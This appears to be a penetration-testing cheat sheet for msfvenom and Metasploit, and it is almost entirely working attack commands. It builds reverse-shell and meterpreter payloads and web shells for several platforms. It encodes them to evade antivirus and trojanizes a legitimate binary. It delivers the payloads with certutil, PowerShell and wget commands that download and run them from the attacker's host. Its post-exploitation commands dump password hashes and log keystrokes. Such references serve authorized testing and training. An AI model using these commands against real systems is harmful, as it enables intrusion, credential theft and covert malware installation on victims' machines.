# msfvenom Cheat Sheet

> Replace `LHOST` with your IP and `LPORT` with your port.

---

## Basic Syntax

```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output_file>
```

---

## Staged vs Stageless

| Type | Notation | Description |
|------|----------|-------------|
| Staged | `/` e.g. `windows/x64/meterpreter/reverse_tcp` | Small loader, pulls rest from Metasploit handler |
| Stageless | `_` e.g. `windows/x64/meterpreter_reverse_tcp` | Self-contained, works with plain nc |

---

## Windows Payloads

```bash
# 64-bit staged meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=LHOST LPORT=LPORT -f exe -o shell64.exe

# 32-bit staged meterpreter
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=LHOST LPORT=LPORT -f exe -o shell32.exe

# 64-bit stageless meterpreter (works with nc)
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=LHOST LPORT=LPORT -f exe -o shell_stageless.exe

# 64-bit raw shell
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=LHOST LPORT=LPORT -f exe -o shell_raw.exe

# Windows service binary
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=LHOST LPORT=LPORT -f exe-service -o service.exe

# DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=LHOST LPORT=LPORT -f dll -o payload.dll

# PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=LHOST LPORT=LPORT -f ps1 -o shell.ps1
```

---

## Linux Payloads

```bash
# 64-bit ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=LHOST LPORT=LPORT -f elf -o shell.elf

# 32-bit ELF
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=LHOST LPORT=LPORT -f elf -o shell32.elf

# Stageless
msfvenom -p linux/x64/meterpreter_reverse_tcp \
  LHOST=LHOST LPORT=LPORT -f elf -o shell_stageless.elf

chmod +x shell.elf
```

---

## Web Payloads

```bash
# PHP
msfvenom -p php/meterpreter_reverse_tcp \
  LHOST=LHOST LPORT=LPORT -f raw -o shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=LHOST LPORT=LPORT -f asp -o shell.asp

# ASPX
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=LHOST LPORT=LPORT -f aspx -o shell.aspx

# JSP (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=LHOST LPORT=LPORT -f raw -o shell.jsp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=LHOST LPORT=LPORT -f war -o shell.war
```

---

## macOS Payloads

```bash
# 64-bit
msfvenom -p osx/x64/meterpreter_reverse_tcp \
  LHOST=LHOST LPORT=LPORT -f macho -o shell.macho

chmod +x shell.macho
```

---

## Android Payload

```bash
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=LHOST LPORT=LPORT -o shell.apk
```

---

## Encoding (Basic AV Evasion)

```bash
# List encoders
msfvenom --list encoders

# x86 — shikata_ga_nai (well-known, detected by most AV)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=LHOST LPORT=LPORT \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o encoded32.exe

# x64 — xor_dynamic
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=LHOST LPORT=LPORT \
  -e x64/xor_dynamic -i 5 \
  -f exe -o encoded64.exe

# Avoid bad characters (useful for buffer overflows)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=LHOST LPORT=LPORT \
  -b "\x00\x0a\x0d" \
  -f exe -o nobadchars.exe
```

> Note: Encoding alone won't bypass modern AV. Use Veil, Shellter, or custom droppers for real evasion.

---

## Inject Into Legitimate Binary (Template)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=LHOST LPORT=LPORT \
  -x /usr/share/windows-binaries/plink.exe \
  -f exe -o fake_plink.exe
```

---

## Generate Shellcode

```bash
# C shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=LHOST LPORT=LPORT -f c

# Python shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=LHOST LPORT=LPORT -f python

# Raw
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=LHOST LPORT=LPORT -f raw -o shellcode.bin
```

---

## Listeners

### Metasploit Handler (required for staged payloads)

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST LHOST
set LPORT LPORT
set ExitOnSession false   # keep listening for multiple connections
run -j                    # run as background job
```

### Netcat (stageless only)

```bash
nc -lvnp LPORT
rlwrap nc -lvnp LPORT
```

---

## Deliver Payload to Target

```bash
# Serve from your machine
python3 -m http.server 8080

# Download on Windows target (CMD)
certutil -urlcache -split -f http://LHOST:8080/shell.exe C:\Windows\Temp\shell.exe
C:\Windows\Temp\shell.exe

# Download on Windows target (PowerShell)
powershell -c "Invoke-WebRequest http://LHOST:8080/shell.exe -OutFile C:\Windows\Temp\shell.exe"
C:\Windows\Temp\shell.exe

# Download on Linux target
wget http://LHOST:8080/shell.elf -O /tmp/shell.elf
chmod +x /tmp/shell.elf && /tmp/shell.elf
```

---

## Useful Meterpreter Commands (post-exploitation)

```bash
sysinfo                  # system info
getuid                   # current user
getsystem                # attempt privilege escalation
getpid                   # current process ID
ps                       # list processes
migrate <PID>            # migrate to another process
shell                    # drop to system shell
upload <file> <path>     # upload file to target
download <file>          # download file from target
hashdump                 # dump password hashes
keyscan_start            # start keylogger
keyscan_dump             # dump keylogger output
screenshare              # live screen view
run post/multi/recon/local_exploit_suggester  # find privesc vectors
background               # background session
sessions -l              # list all sessions
sessions -i <id>         # interact with session
```

---

## Common Flags Reference

| Flag | Description |
|------|-------------|
| `-p` | Payload |
| `-f` | Output format |
| `-o` | Output file |
| `-e` | Encoder |
| `-i` | Encode iterations |
| `-b` | Bad characters to avoid |
| `-x` | Template executable |
| `-k` | Keep template behavior |
| `--list payloads` | List all payloads |
| `--list formats` | List output formats |
| `--list encoders` | List encoders |

---

## Quick Payload Reference

| Target | Payload |
|--------|---------|
| Windows 64-bit | `windows/x64/meterpreter/reverse_tcp` |
| Windows 32-bit | `windows/meterpreter/reverse_tcp` |
| Linux 64-bit | `linux/x64/meterpreter/reverse_tcp` |
| Linux 32-bit | `linux/x86/meterpreter/reverse_tcp` |
| PHP web shell | `php/meterpreter_reverse_tcp` |
| ASPX web shell | `windows/meterpreter/reverse_tcp` + `-f aspx` |
| Android | `android/meterpreter/reverse_tcp` |
| macOS | `osx/x64/meterpreter_reverse_tcp` |
